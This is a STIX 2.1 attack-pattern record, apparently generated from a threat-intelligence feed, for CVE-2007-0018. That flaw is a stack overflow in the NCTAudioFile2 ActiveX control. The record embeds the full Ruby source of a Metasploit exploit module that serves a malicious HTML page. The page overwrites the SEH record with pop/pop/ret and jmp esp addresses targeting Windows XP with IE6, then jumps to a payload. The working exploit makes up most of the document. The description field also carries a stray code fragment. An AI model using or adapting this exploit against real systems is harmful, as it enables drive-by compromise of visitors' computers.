{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--65af6c49-424a-4711-aba3-b93ca3c8dfc7",
    "created": "2024-08-14T16:43:21.892779Z",
    "modified": "2024-08-14T16:43:21.892784Z",
    "name": "NCTAudioFile2 v2.x ActiveX Control SetFormatLikeSample() Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the NCTAudioFile2.Audio ActiveX Control provided by various audio applications. By sending an overly long string to the \"SetFormatLikeSample()\" method, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/nctaudiofile2_setformatlikesample.rb",
            "external_id": "nctaudiofile2_setformatlikesample.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-0018"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NCTAudioFile2 v2.x ActiveX Control SetFormatLikeSample() Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the NCTAudioFile2.Audio ActiveX\n        Control provided by various audio applications. By sending an overly long\n        string to the \"SetFormatLikeSample()\" method, an attacker may be able to\n        execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC', 'dookie', 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-0018' ],\n          [ 'OSVDB', '32032' ],\n          [ 'BID', '22196' ],\n          [ 'US-CERT-VU', '292713' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 2048,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # tested with:\n          #\n          # BearShare 6.0.2.26789 (NCTAudioFile2.dll v2.5.7.514)\n          # BearShare 6.0.0.22717 (NCTAudioFile2.dll v2.5.7.514)\n          # Magic Audio Editor Pro v10.3.11 (NCTAudioFile2.dll v2.6.1.643)\n          # Magic Audio Editor Pro v10.3.15.1 (NCTAudioFile2.dll v2.6.1.643)\n          #\n          [ 'Windows XP SP2/SP3 Pro English (IE6)',\n            {\n              'PopPopRet' => 0x746C15A9, # p/p/r in msls31.dll (ie6)\n              'jmp esp' => 0x774699bf, # user32.dll (xp sp2 and sp3)\n            }\n          ],\n        ],\n      'DisclosureDate' => '2007-01-24',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # dual targeting super fun..\n    sploit = p.encoded\n    sploit << rand_text_alpha(4100 - p.encoded.length)\n\n    # if seh is triggered, we'll use a pop/pop/ret\n    seh = generate_seh_record(target['PopPopRet'])\n    sploit << seh\n\n    # padding\n    sploit << make_nops(16 - seh.length)\n\n    # otherwise, we need to jump to the stack\n    sploit << [target['jmp esp']].pack('V')\n    sploit << make_nops(32)\n\n    # jump back to the payload :)\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-0x1000\").encode_string\n\n    # try to ensure SEH is triggered..\n    sploit << rand_text_alpha(1000) * 18\n\n    # Build out the message\n    content = %Q|\n<html>\n<body>\n<object classid='clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC' id='#{vname}'></object>\n<script language='javascript'>\nvar #{vname} = document.getElementById('#{vname}');\nvar #{strname} = new String('#{sploit}');\n#{vname}.SetFormatLikeSample(#{strname});\n</script>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-01-24",
    "x_mitre_platforms": [
        "win'"
    ]
}